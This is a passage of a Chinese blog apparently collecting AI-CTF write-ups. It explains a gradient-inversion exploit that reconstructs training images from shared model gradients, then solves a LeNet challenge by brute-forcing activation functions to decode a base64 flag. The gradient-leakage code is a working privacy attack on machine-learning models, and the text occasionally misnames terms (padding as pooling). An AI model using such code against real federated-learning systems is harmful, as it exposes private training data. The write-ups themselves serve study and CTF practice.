<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line"><span class="keyword">from</span> torchvision <span class="keyword">import</span> transforms</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AliceNet2</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(AliceNet2, self).__init__()</span><br><span class="line">        self.conv = \</span><br><span class="line">            nn.Sequential(</span><br><span class="line">            nn.Conv2d(<span class="number">3</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">2</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>, stride=<span class="number">2</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">1</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">1</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">        )</span><br><span class="line">        self.fc = \</span><br><span class="line">            nn.Sequential(</span><br><span class="line">            nn.Linear(<span class="number">768</span>, <span class="number">200</span>)</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = self.conv(x)</span><br><span class="line">        x = x.view(x.size(<span class="number">0</span>), -<span class="number">1</span>)</span><br><span class="line">        x = self.fc(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">criterion</span>(<span class="params">pred_y, grand_y</span>):</span><br><span class="line">    <span class="comment"># This is the Cross entropy loss function</span></span><br><span class="line">    tmptensor=torch.mean(</span><br><span class="line">        torch.<span class="built_in">sum</span>(</span><br><span class="line">            - grand_y * F.log_softmax(pred_y, dim=-<span class="number">1</span>), <span class="number">1</span></span><br><span class="line">        ))</span><br><span class="line">    <span class="keyword">return</span> tmptensor</span><br><span class="line"></span><br><span class="line">ts1 = transforms.Compose([transforms.Resize(<span class="number">32</span>),transforms.CenterCrop(<span class="number">32</span>),transforms.ToTensor()])</span><br><span class="line">ts2 = transforms.ToPILImage()</span><br><span class="line"></span><br><span class="line">my_device = <span class="string">&quot;cpu&quot;</span></span><br><span class="line"><span class="keyword">if</span> torch.cuda.is_available():</span><br><span class="line">    my_device = <span class="string">&quot;cuda&quot;</span></span><br><span class="line"></span><br><span class="line">Net = torch.load(<span class="string">&#x27;./Net.model&#x27;</span>).to(my_device)</span><br><span class="line">outpath=<span class="string">&#x27;./grad/&#x27;</span></span><br><span class="line"></span><br><span class="line">torch.manual_seed(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">    original_dy_dx=dy_dx=torch.load(outpath+<span class="built_in">str</span>(i)+<span class="string">&#x27;.tensor&#x27;</span>)</span><br><span class="line">    dummy_data = torch.randn(<span class="number">1</span>,<span class="number">3</span>,<span class="number">32</span>,<span class="number">32</span>).to(my_device).requires_grad_(<span class="literal">True</span>)</span><br><span class="line">    dummy_label = torch.randn(<span class="number">1</span>,<span class="number">200</span>).to(my_device).requires_grad_(<span class="literal">True</span>)</span><br><span class="line">    optimizer = torch.optim.LBFGS([dummy_data, dummy_label])</span><br><span class="line">    history = []</span><br><span class="line">    <span class="keyword">for</span> iters <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">closure</span>():</span><br><span class="line">            optimizer.zero_grad()</span><br><span class="line">            pred = Net(dummy_data)</span><br><span class="line">            dummy_onehot_label = F.softmax(dummy_label, dim=-<span class="number">1</span>)</span><br><span class="line">            dummy_loss = criterion(pred,</span><br><span class="line">                                   dummy_onehot_label)</span><br><span class="line">            dummy_dy_dx = torch.autograd.grad(dummy_loss, Net.parameters(), create_graph=<span class="literal">True</span>)</span><br><span class="line">            grad_diff = <span class="number">0</span></span><br><span class="line">            grad_count = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> gx, gy <span class="keyword">in</span> <span class="built_in">zip</span>(dummy_dy_dx, original_dy_dx):</span><br><span class="line">                grad_diff += ((gx - gy) ** <span class="number">2</span>).<span class="built_in">sum</span>()</span><br><span class="line">                grad_count += gx.nelement()</span><br><span class="line">            grad_diff.backward()</span><br><span class="line">            <span class="keyword">return</span> grad_diff</span><br><span class="line"></span><br><span class="line">        optimizer.step(closure)</span><br><span class="line">        <span class="keyword">if</span> iters % <span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">            current_loss = closure()</span><br><span class="line">            <span class="built_in">print</span>(iters, <span class="string">&quot;%.4f&quot;</span> % current_loss.item())</span><br><span class="line">        history.append(ts2(dummy_data[<span class="number">0</span>].cpu()))</span><br><span class="line"></span><br><span class="line">    plt.figure(figsize=(<span class="number">12</span>, <span class="number">8</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">        plt.subplot(<span class="number">3</span>, <span class="number">10</span>, i + <span class="number">1</span>)</span><br><span class="line">        plt.imshow(history[i * <span class="number">10</span>])</span><br><span class="line">        plt.title(<span class="string">&quot;iter=%d&quot;</span> % (i * <span class="number">10</span>))</span><br><span class="line">        plt.axis(<span class="string">&#x27;off&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Dummy label is %d.&quot;</span> % torch.argmax(dummy_label, dim=-<span class="number">1</span>).item())</span><br><span class="line">    plt.show()</span><br></pre></td></tr></table></figure>
<p>根据出题人给出的exp，尝试运行，但实际恢复效果却不太好？</p>
<p>这边对每一部分代码进行解释</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AliceNet2</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(AliceNet2, self).__init__()</span><br><span class="line">        self.conv = \</span><br><span class="line">            nn.Sequential(</span><br><span class="line">            nn.Conv2d(<span class="number">3</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">2</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>, stride=<span class="number">2</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">1</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">1</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">        )</span><br><span class="line">        self.fc = \</span><br><span class="line">            nn.Sequential(</span><br><span class="line">            nn.Linear(<span class="number">768</span>, <span class="number">200</span>)</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = self.conv(x)</span><br><span class="line">        x = x.view(x.size(<span class="number">0</span>), -<span class="number">1</span>)</span><br><span class="line">        x = self.fc(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">criterion</span>(<span class="params">pred_y, grand_y</span>):</span><br><span class="line">    <span class="comment"># This is the Cross entropy loss function</span></span><br><span class="line">    tmptensor=torch.mean(</span><br><span class="line">        torch.<span class="built_in">sum</span>(</span><br><span class="line">            - grand_y * F.log_softmax(pred_y, dim=-<span class="number">1</span>), <span class="number">1</span></span><br><span class="line">        ))</span><br><span class="line">    <span class="keyword">return</span> tmptensor</span><br></pre></td></tr></table></figure>
<p>这里初识化定义了一个卷积神经网络模型LeNet，在原论文中除了LeNet网络模型，还有一种为Resnet，暂时先对这一种进行理解。序列里包含了四个卷积层，每个卷积层后面跟着一个 Sigmoid 激活函数。每个卷积层使用 5x5 的卷积核，具有不同的步长 (<code>stride</code>) 和池化(<code>padding</code>)。</p>
<p>然后包含一个线性全连接层，输入特征数为 768（由前面的卷积层产生）和输出特征数为 200。通过这个全连接层，网络将图像的特征映射到一个 200 维的空间，通常用于图像分类及特征提取。</p>
<p>其中forward方法定义了数据在通过模型时的前向传播过程，输入数据 <code>x</code> 经过卷积层处理，然后被拉直成一维向量，最后经过全连接层 得到最终输出。</p>
<p>criterion 函数定义了交叉熵损失函数，用于衡量模型输出与目标标签之间的差异。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ts1 = transforms.Compose([transforms.Resize(<span class="number">32</span>),transforms.CenterCrop(<span class="number">32</span>),transforms.ToTensor()])</span><br><span class="line">ts2 = transforms.ToPILImage()</span><br></pre></td></tr></table></figure>
<p>这里的两行主要是进行图像转换的一些操作，第一行用于图像转换为张量，第二行用于张量转换为图像，即图像的预处理和后处理。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_device = <span class="string">&quot;cpu&quot;</span></span><br><span class="line"><span class="keyword">if</span> torch.cuda.is_available():</span><br><span class="line">    my_device = <span class="string">&quot;cuda&quot;</span></span><br><span class="line"></span><br><span class="line">Net = torch.load(<span class="string">&#x27;./Net.model&#x27;</span>).to(my_device)</span><br><span class="line">outpath=<span class="string">&#x27;./grad/&#x27;</span></span><br></pre></td></tr></table></figure>
<p>使用计算机cuda进行计算，以及对模型和张量数据的导入处理</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">torch.manual_seed(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p><code>torch.manual_seed(0)</code> 的作用是设置 PyTorch 中的随机数生成器的种子为 0，相同的随机数种子将产生相同的随机数序列。而在这种攻击方法中，有涉及到伪标签和伪数据的初始化，所以设置seed种子，尽可能保证生成的相似性。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">    original_dy_dx=dy_dx=torch.load(outpath+<span class="built_in">str</span>(i)+<span class="string">&#x27;.tensor&#x27;</span>)</span><br><span class="line">    dummy_data = torch.randn(<span class="number">1</span>,<span class="number">3</span>,<span class="number">32</span>,<span class="number">32</span>).to(my_device).requires_grad_(<span class="literal">True</span>)</span><br><span class="line">    dummy_label = torch.randn(<span class="number">1</span>,<span class="number">200</span>).to(my_device).requires_grad_(<span class="literal">True</span>)</span><br><span class="line">    optimizer = torch.optim.LBFGS([dummy_data, dummy_label])</span><br><span class="line">    history = []</span><br><span class="line">    <span class="keyword">for</span> iters <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">closure</span>():</span><br><span class="line">            optimizer.zero_grad()</span><br><span class="line">            pred = Net(dummy_data)</span><br><span class="line">            dummy_onehot_label = F.softmax(dummy_label, dim=-<span class="number">1</span>)</span><br><span class="line">            dummy_loss = criterion(pred,</span><br><span class="line">                                   dummy_onehot_label)</span><br><span class="line">            dummy_dy_dx = torch.autograd.grad(dummy_loss, Net.parameters(), create_graph=<span class="literal">True</span>)</span><br><span class="line">            grad_diff = <span class="number">0</span></span><br><span class="line">            grad_count = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> gx, gy <span class="keyword">in</span> <span class="built_in">zip</span>(dummy_dy_dx, original_dy_dx):</span><br><span class="line">                grad_diff += ((gx - gy) ** <span class="number">2</span>).<span class="built_in">sum</span>()</span><br><span class="line">                grad_count += gx.nelement()</span><br><span class="line">            grad_diff.backward()</span><br><span class="line">            <span class="keyword">return</span> grad_diff</span><br><span class="line"></span><br><span class="line">        optimizer.step(closure)</span><br><span class="line">        <span class="keyword">if</span> iters % <span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">            current_loss = closure()</span><br><span class="line">            <span class="built_in">print</span>(iters, <span class="string">&quot;%.4f&quot;</span> % current_loss.item())</span><br><span class="line">        history.append(ts2(dummy_data[<span class="number">0</span>].cpu()))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这一段是论文思想的核心重点就是创建dummy_data,dummy_label所得到的梯度与原始训练数据所得到的梯度的均方误差，再用损失函数对dummy_data,dummy_label最优化，不断迭代以恢复出原始数据，但是可能也就是这里存在问题，使得我实际得到的图像效果不佳，但暂时还没确定问题的原因。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plt.figure(figsize=(<span class="number">12</span>, <span class="number">8</span>))</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">       plt.subplot(<span class="number">3</span>, <span class="number">10</span>, i + <span class="number">1</span>)</span><br><span class="line">       plt.imshow(history[i * <span class="number">10</span>])</span><br><span class="line">       plt.title(<span class="string">&quot;iter=%d&quot;</span> % (i * <span class="number">10</span>))</span><br><span class="line">       plt.axis(<span class="string">&#x27;off&#x27;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;Dummy label is %d.&quot;</span> % torch.argmax(dummy_label, dim=-<span class="number">1</span>).item())</span><br><span class="line">   plt.show()</span><br></pre></td></tr></table></figure>
<p>这一段就是将所优化后的数据进行可视化操作，以达成数据恢复的目的</p>
<p>然后根据相关资料找了一个改进的攻击方法</p>
]]></content>
      <categories>
        <category>AI</category>
        <category>AI-CTF</category>
      </categories>
      <tags>
        <tag>2022*CTF</tag>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title>AI-CTF（2）LeNet</title>
    <url>/2023/11/18/AI-CTF%EF%BC%882%EF%BC%89LeNet/</url>
    <content><![CDATA[<h1>AI-CTF（2）LeNet</h1>
<p>本题来自2023香山杯，目前已上线i春秋平台</p>
<p><a href="https://www.ichunqiu.com/battalion?t=1&amp;r=70899">https://www.ichunqiu.com/battalion?t=1&amp;r=70899</a></p>
<p>赛事进行时解出来的仅有国科大师傅的一支队伍，后续有看过他们的题解，但是没看明白，所以一直没有复现，后来出题方给出了官方题解和思路介绍，才明白本题的意思。</p>
<p>另外，做题前先看一下LeNet的网络结构</p>
<p>这是一个经典的手写识别模型，首先看一下基本的结构图</p>
<p><img src="https://s2.loli.net/2023/11/18/vCRd6oXKi1EH2Nh.png" alt=""></p>
<ul>
<li>
<p>池化（ Padding ）是指在输入数据的边缘添加一定数量的像素，使得输出数据的尺寸能够与输入数据相匹配。也就是在矩阵的边界上填充一些值，以增加矩阵的大小，通常用 0 或者复制边界像素来进行填充。</p>
</li>
<li>
<p>步幅（Stride）是指卷积核在每一次卷积操作中滑动的距离。步长的大小可以影响输出数据的大小，也可以影响特征提取能力和计算复杂度。当步长增大时，输出数据的尺寸会减小，特征提取能力会变弱，但计算速度会加快。</p>
</li>
<li>
<p>通道数（Channel）也称为深度或特征图数量，是指卷积神经网络中每一层输出的特征图数量。通道数的大小直接影响了卷积神经网络的特征提取能力和计算复杂度。通过增加通道数，可以增强卷积神经网络的特征提取能力，但也会增加计算复杂度。</p>
</li>
</ul>
<p>LeNet的网络结构相对简单，主要由卷积层、池化层和全连接层组成。</p>
<ol>
<li>
<p><strong>卷积层（Convolutional Layers）:</strong></p>
<ul>
<li>第一层：卷积层，使用卷积操作提取特征，通常包含多个卷积核（filters）。</li>
<li>激活函数：通常在卷积层后使用sigmoid或tanh等激活函数。</li>
</ul>
</li>
<li>
<p><strong>池化层（Pooling Layers）:</strong></p>
<ul>
<li>第一层：池化层，通过最大池化或平均池化减小特征图的尺寸，降低计算复杂度。</li>
</ul>
</li>
<li>
<p><strong>卷积层（Convolutional Layers）:</strong></p>
<ul>
<li>第二层：再次使用卷积层，提取更高级的特征。</li>
</ul>
</li>
<li>
<p><strong>池化层（Pooling Layers）:</strong></p>
<ul>
<li>第二层：再次使用池化层，继续降低特征图的尺寸。</li>
</ul>
</li>
<li>
<p><strong>Flatten层：</strong></p>
<ul>
<li>将池化层的输出展平为一维向量，为了连接到全连接层做准备。</li>
</ul>
</li>
<li>
<p><strong>全连接层（Fully Connected Layers）:</strong></p>
<ul>
<li>第一层：通常包含几百个神经元，用于学习更抽象的特征。</li>
<li>激活函数：通常使用sigmoid或tanh等激活函数。</li>
</ul>
</li>
<li>
<p><strong>全连接层（Fully Connected Layers）:</strong></p>
<ul>
<li>第二层：输出层，神经元数量等于分类的类别数。</li>
<li>激活函数：通常使用softmax函数，用于多类别分类问题。</li>
</ul>
</li>
</ol>
<p>下载附件有三个文件，分别是flag.rar，label.json，<a href="http://MyLeNet.pt">MyLeNet.pt</a>。所以首先针对模型查看，尝试复原</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line">pt = torch.load(<span class="string">&quot;./MyLeNet.pt&quot;</span>, map_location=<span class="string">&quot;cpu&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> pt:</span><br><span class="line">    <span class="built_in">print</span>(i,pt[i].shape)</span><br></pre></td></tr></table></figure>
<p>所获得的网络结构</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conv1.weight torch.Size([6, 1, 5, 5])</span><br><span class="line">conv1.bias torch.Size([6])</span><br><span class="line">conv2.weight torch.Size([16, 6, 5, 5])</span><br><span class="line">conv2.bias torch.Size([16])</span><br><span class="line">fc1.weight torch.Size([120, 256])</span><br><span class="line">fc1.bias torch.Size([120])</span><br><span class="line">fc2.weight torch.Size([84, 120])</span><br><span class="line">fc2.bias torch.Size([84])</span><br><span class="line">fc3.weight torch.Size([62, 84])</span><br><span class="line">fc3.bias torch.Size([62])</span><br></pre></td></tr></table></figure>
<p>一个LeNet模型的网络结构</p>
<ol>
<li>
<p><code>conv1</code>: 一个卷积层，输入通道数为1（灰度图像），输出通道数为6，卷积核大小为5x5。</p>
<ul>
<li><code>conv1.weight</code> 的形状为 <code>[6, 1, 5, 5]</code>，表示有6个卷积核，每个卷积核的大小为5x5。</li>
<li><code>conv1.bias</code> 的形状为 <code>[6]</code>，表示每个卷积核有一个偏置项。</li>
</ul>
</li>
<li>
<p><code>conv2</code>: 第二个卷积层，输入通道数为6，输出通道数为16，卷积核大小为5x5。</p>
<ul>
<li><code>conv2.weight</code> 的形状为 <code>[16, 6, 5, 5]</code>，表示有16个卷积核，每个卷积核的大小为5x5。</li>
<li><code>conv2.bias</code> 的形状为 <code>[16]</code>，表示每个卷积核有一个偏置项。</li>
</ul>
</li>
<li>
<p><code>fc1</code>: 第一个全连接层，输入特征数为<code>16 * 5 * 5</code>（第二个卷积层输出的特征图展平成一维向量），输出特征数为120。</p>
<ul>
<li><code>fc1.weight</code> 的形状为 <code>[120, 16 * 5 * 5]</code>，表示连接到全连接层的权重矩阵。</li>
<li><code>fc1.bias</code> 的形状为 <code>[120]</code>，表示全连接层的偏置项。</li>
</ul>
</li>
<li>
<p><code>fc2</code>: 第二个全连接层，输入特征数为120，输出特征数为84。</p>
<ul>
<li><code>fc2.weight</code> 的形状为 <code>[84, 120]</code>，表示连接到全连接层的权重矩阵。</li>
<li><code>fc2.bias</code> 的形状为 <code>[84]</code>，表示全连接层的偏置项。</li>
</ul>
</li>
<li>
<p><code>fc3</code>: 第三个全连接层，输入特征数为84，输出特征数为62。</p>
<ul>
<li><code>fc3.weight</code> 的形状为 <code>[62, 84]</code>，表示连接到全连接层的权重矩阵。</li>
<li><code>fc3.bias</code> 的形状为 <code>[62]</code>，表示全连接层的偏置项。</li>
</ul>
</li>
</ol>
<p>目前已知的网络结构已经包含了卷积层，全连接层，但是可以发现这之间是缺少了损失函数的。</p>
<p>当然这里参考并且了解了一下官方思路和唯一解题队伍思路的区别。</p>
<p>从官方出题人思路来看需要考虑池化存在两种方式和激活函数</p>
<ol>
<li>
<p>暂且按照LeNet神经网络中的最大池化来设计，于是可以写出如下网络结构</p>
<ul>
<li>当采用最大池化时，激活和池化的顺序并不影响计算结果</li>
<li>卷积 -&gt; 激活 -&gt; 池化</li>
<li>卷积 -&gt; 池化 -&gt; 激活</li>
<li>最大池化</li>
<li>平均池化</li>
</ul>
</li>
<li>
<p>常见的激活函数有如下4+1种</p>
<ul>
<li>Sigmoid函数</li>
<li>Tanh/双曲正切函数</li>
<li>ReLU函数</li>
<li>Softmax函数(一般出现在一个网络的最后一层)</li>
<li>未使用激活函数</li>
</ul>
</li>
</ol>
<p>（PS：实际在LeNet网络中，通常使用Sigmoid或Tanh激活函数在全连接层中，而在卷积层中可能使用Sigmoid、Tanh、ReLU等）</p>
<p>而在实际解题队伍是通过查看pt的pkl文件去发现模型中使用了Sigmoid函数和ReLU函数，然后再每一个需要使用的链接处进行遍历，查看哪一个能实际输出所需要的。</p>
<p><img src="https://s2.loli.net/2023/11/18/JKsFoHWEc7OnwBk.png" alt=""></p>
<p>（PS：复现到这边的时候又卡壳了，官方给出的exp不完全，qwq）</p>
<p>其实就是文件还剩下的一个label.json，以此作为标签映射</p>
<p>这是通过官方的给出的题解修改得到的完整exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">pt = torch.load(<span class="string">&quot;./MyLeNet.pt&quot;</span>, map_location=<span class="string">&#x27;cpu&#x27;</span>)</span><br><span class="line"><span class="comment"># 这里是完整复原的网络结构，基本符合了上面所告知的LeNet层</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyLeNet</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, list_func</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.idx = list_func</span><br><span class="line">        self.func = [<span class="literal">None</span>, nn.Sigmoid(), nn.Tanh(), nn.ReLU(), nn.Softmax()]</span><br><span class="line">        self.conv1 = nn.Conv2d(in_channels=<span class="number">1</span>, out_channels=<span class="number">6</span>, kernel_size=<span class="number">5</span>, stride=<span class="number">1</span>)</span><br><span class="line">        self.maxpool1 = nn.MaxPool2d(kernel_size=<span class="number">2</span>, stride=<span class="number">2</span>)</span><br><span class="line">        self.conv2 = nn.Conv2d(in_channels=<span class="number">6</span>, out_channels=<span class="number">16</span>, kernel_size=<span class="number">5</span>, stride=<span class="number">1</span>)</span><br><span class="line">        self.maxpool2 = nn.MaxPool2d(kernel_size=<span class="number">2</span>, stride=<span class="number">2</span>)</span><br><span class="line">        self.fc1 = nn.Linear(<span class="number">16</span> * <span class="number">4</span> * <span class="number">4</span>, <span class="number">120</span>)</span><br><span class="line">        self.fc2 = nn.Linear(<span class="number">120</span>, <span class="number">84</span>)</span><br><span class="line">        self.fc3 = nn.Linear(<span class="number">84</span>, <span class="number">62</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = self.conv1(x)</span><br><span class="line">        <span class="keyword">if</span> self.idx[<span class="number">0</span>] &gt; <span class="number">0</span>:</span><br><span class="line">            x = self.func[self.idx[<span class="number">0</span>]](x)</span><br><span class="line">        x = self.maxpool1(x)</span><br><span class="line">        x = self.conv2(x)</span><br><span class="line">        <span class="keyword">if</span> self.idx[<span class="number">1</span>] &gt; <span class="number">0</span>:</span><br><span class="line">            x = self.func[self.idx[<span class="number">1</span>]](x)</span><br><span class="line">        x = self.maxpool2(x)</span><br><span class="line">        x = torch.flatten(x, start_dim=<span class="number">1</span>)</span><br><span class="line">        x = self.fc1(x)</span><br><span class="line">        <span class="keyword">if</span> self.idx[<span class="number">2</span>] &gt; <span class="number">0</span>:</span><br><span class="line">            x = self.func[self.idx[<span class="number">2</span>]](x)</span><br><span class="line">        x = self.fc2(x)</span><br><span class="line">        <span class="keyword">if</span> self.idx[<span class="number">3</span>] &gt; <span class="number">0</span>:</span><br><span class="line">            x = self.func[self.idx[<span class="number">3</span>]](x)</span><br><span class="line">        x = self.fc3(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"><span class="comment"># 从label.json加载标签映射</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./label.json&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> json_file:</span><br><span class="line">    label_mapping = json.load(json_file)</span><br><span class="line"><span class="comment"># 反转字典，将整数编码映射回字母</span></span><br><span class="line">reverse_label_mapping = &#123;v: k <span class="keyword">for</span> k, v <span class="keyword">in</span> label_mapping.items()&#125;</span><br><span class="line"><span class="comment"># 获取所有标签</span></span><br><span class="line">chars = <span class="built_in">list</span>(reverse_label_mapping.values())</span><br><span class="line">arrange_list = [[ j, k, l, m] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>) <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>) <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line"><span class="comment"># 这一部分会输出所有生成的base64</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">for idxs in arrange_list[:500]:</span></span><br><span class="line"><span class="string">    model = MyLeNet(idxs)</span></span><br><span class="line"><span class="string">    model.load_state_dict(pt)</span></span><br><span class="line"><span class="string">    tmp = &quot;&quot;</span></span><br><span class="line"><span class="string">    for i in range(56):</span></span><br><span class="line"><span class="string">        npy_0 = np.load(&quot;./flag/&quot;+str(i)+&quot;.npy&quot;).reshape((1,1,28,28)) # 调整样本为输入形状</span></span><br><span class="line"><span class="string">        tmp += str(chars[int(model(torch.tensor(npy_0).to(&#x27;cpu&#x27;)).argmax())])</span></span><br><span class="line"><span class="string">        print(tmp[-1],end=&#x27;&#x27;)</span></span><br><span class="line"><span class="string">    print()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 改进后的实现查找开头为flag的字符串</span></span><br><span class="line"><span class="keyword">for</span> idxs <span class="keyword">in</span> arrange_list:</span><br><span class="line">    model = MyLeNet(idxs)</span><br><span class="line">    model.load_state_dict(pt)</span><br><span class="line">    tmp = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">56</span>):</span><br><span class="line">        npy_0 = np.load(<span class="string">&quot;./flag/&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;.npy&quot;</span>).reshape((<span class="number">1</span>,<span class="number">1</span>,<span class="number">28</span>,<span class="number">28</span>))</span><br><span class="line">        tmp += chars[<span class="built_in">int</span>(model(torch.tensor(npy_0).to(<span class="string">&#x27;cpu&#x27;</span>)).argmax())]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        flag = base64.b64decode(tmp).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="comment"># 已知flag为开头，所以可以通过这个去进行相应的查找</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="built_in">print</span>(idxs)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>官方给出的exp是将可能的方法存储于指定列表，然后去查找，所以再此另外补充一份，确定了网络结构的exp，因为通过官方wp，已经得出了相应的激活函数，所以就不浪费时间了</p>
<p>搓了另外一份简化版exp，当然了，是得知了激活函数的前提下啦</p>
